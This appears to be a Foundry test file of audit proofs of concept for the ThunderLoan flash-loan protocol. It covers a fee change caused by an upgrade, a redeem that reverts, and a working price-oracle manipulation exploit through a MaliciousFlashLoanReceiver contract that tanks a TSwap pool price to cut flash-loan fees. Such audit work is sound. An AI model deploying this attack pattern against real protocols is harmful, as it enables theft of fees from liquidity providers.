// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { ThunderLoanTest, ThunderLoan } from "../unit/ThunderLoanTest.t.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import { TSwapPool } from "./TSwapPool.sol";
import { IFlashLoanReceiver, IThunderLoan } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { PoolFactory } from "./PoolFactory.sol";

contract ProofOfCodes is ThunderLoanTest {
    function testUpgradeBreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded),"");
        uint256 feeAfterUpgrade = thunderLoan.getFee();
        vm.stopPrank();

        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }

    function testRedeemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.redeem(tokenA, amountToRedeem);
        vm.stopPrank();
    }

    function testCanManipuleOracleToIgnoreFees() public {
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");

        PoolFactory pf = new PoolFactory();
        pf.createPool(address(tokenA));

        address tswapPool = pf.getPool(address(tokenA));

        // Overwrite the WETH address
        deployCodeTo("ERC20Mock.sol:ERC20Mock", address(TSwapPool(tswapPool).WETH_TOKEN()));
        weth = ERC20Mock(address(TSwapPool(tswapPool).WETH_TOKEN()));

        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // Fund tswap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswapPool), 100e18);
        TSwapPool(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
        vm.stopPrank();

        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);

        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();

        // TSwap has 100 WETH & 100 tokenA
        // ThunderLoan has 1,000 tokenA
        // If we borrow 50 tokenA -> swap it for WETH (tank the price) -> borrow another 50 tokenA (do something) ->
        // repay both
        // We pay drastically lower fees

        // here is how much we'd pay normally
        uint256 calculatedFeeNormal = thunderLoan.getCalculatedFee(tokenA, 100e18);

        uint256 amountToBorrow = 50e18;
        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(address(tswapPool));
        vm.startPrank(user);
        tokenA.mint(address(flr), AMOUNT);
        tokenA.mint(address(flr), 50e18);
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 calculatedFeeAttack = flr.feeOne() + flr.feeTwo();
        console.log("Normal fee: %s", calculatedFeeNormal);
        console.log("Attack fee: %s", calculatedFeeAttack);
        assert(calculatedFeeAttack < calculatedFeeNormal);
    }
}

contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    bool attacked;
    TSwapPool pool;
    uint256 public feeOne;
    uint256 public feeTwo;

    constructor(address tswapPool) {
        pool = TSwapPool(tswapPool);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /* initiator */
        bytes calldata /* params */
    )
        external
        returns (bool)
    {
        if (!attacked) {
            feeOne = fee;
            attacked = true;
            uint256 expected = pool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(pool), 50e18);
            pool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, expected, block.timestamp);
            IERC20(token).approve(msg.sender, amount + fee);
            IThunderLoan(msg.sender).repay(token, amount + fee);
        } else {
            feeTwo = fee;
            IERC20(token).approve(msg.sender, amount + fee);
            IThunderLoan(msg.sender).repay(token, amount + fee);
        }
        return true;
    }
}
